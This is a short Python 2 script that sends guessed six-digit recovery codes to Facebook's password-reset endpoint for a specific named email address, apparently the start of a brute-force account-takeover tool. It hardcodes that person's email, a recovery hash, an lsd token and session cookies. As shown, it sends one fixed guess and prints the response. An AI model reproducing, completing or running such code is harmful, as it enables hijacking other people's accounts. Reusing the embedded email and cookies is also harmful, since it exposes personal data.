import socket
import os
import urllib
import urllib2


#Variables

#URL
url_target = 'http://www.facebook.com/recover/code?recover_method=send_email&em[0]=leonloh125%40gmail.com&hash=AUYRdta1zGm5MeZ8'
#GNUMBER
width = 6
num = 1
gnumber = (width - len(str(num))) * "0" +str(num)

#URL
port = "443"


url1 = 'http://www.facebook.com/recover/code?em[0]='
url2 = 'leonloh125@gmail.com'; #Change this
url3 = '&recover_method='
url4 = 'send_email'; #Change this
m_url = url1 + url2 + url3 + url4

#Ref

ref_url1 = 'https://www.facebook.com/recover/code?em[0]='
ref_url2 = 'leonloh125@gmail.com' #Change the email
ref_url3 = '&rm=send_email&src_flow=skip_initiate&hash='
ref_url4 = 'AUasGR8L8qHjo__k' #Change the hash
mref_url = ref_url1 + ref_url2 + ref_url3 + ref_url4

#Cookies
cookie_ref_url1 = 'fr=09nj4EdE4FHteQdKv..BaUksq.KD.AAA.0.0.BaUkw4.AWVYgKNE; sb=KktSWhOV4pPwGFgJufLhistC; wd=1280x594; datr=KktSWtsyE6-RJXpWf2mQPbbO; reg_fb_ref='
cookie_ref_url2 = ref_url1 + ref_url2 + ref_url3 + ref_url4
cookie_ref_url3 = '; reg_fb_gate=https://www.facebook.com/; sfiu=AYj3FlpNvB_RtcWkHRFTRQ6eLZV5flaibjIs9WIbxyMv0KEK0G2Jt46g3v9_dLNKqW99BSrZ6xuNkZlzaGSMdifH4A_Z80ql9dW9fDxaf091mnIif6HkfYDNgICvjjvXslarCWE5Cr_boIkvDo5gKnVicDLVPH4hbxEXcy2L_p_YPzRAUvuJN6NEaB4MSonQItg'
mcookie_ref_url = cookie_ref_url1 + cookie_ref_url2 + cookie_ref_url3

#DATA
data = "lsd=AVqUvJPT&n="
data2 = int(0)
data3 = '&reset_aciton=1'

#ENDOFVARIABLES

##PROXY_COMMAND
#proxy_support = urllib2.ProxyHandler({'http':'127.0.01'})
#opener = urllib2.build_proxy(proxy_support)
#urllib2.install_opener(opener)
##END_OF_PROXY_COMMAND


#MAIN COMMAND
datax = urllib.urlencode({'lsd' : 'AVqUvJPT' , 'n' : '678795' , 'reset_action' : 1})
req = urllib2.Request(url_target,datax)
req.add_header('Host', 'www.facebook.com')
#req.add_header('User-Agent', 'Mozilla/5.0 (Xll; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0')
#req.add_header('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
#req.add_header('Accept-Language','en-US,en;q=0.5')
#req.add_header('Accept-Encoding','gzip,deflate')
#req.add_header('Referer',mref_url)
#req.add_header('Content-Type' ,'application/x-www-form-urlencoded')
#req.add_header('Content-Length',int(36))
#req.add_header('Cookie', mcookie_ref_url)
#req.add_header('DNT',1)
#req.add_header('Connection','close')
#req.add_header('Upgrade-Insecure-Requests',int(1))


print "Test PIN : " + gnumber
result = urllib2.urlopen(req).read()
print result
print "\n\n"
print len(result)
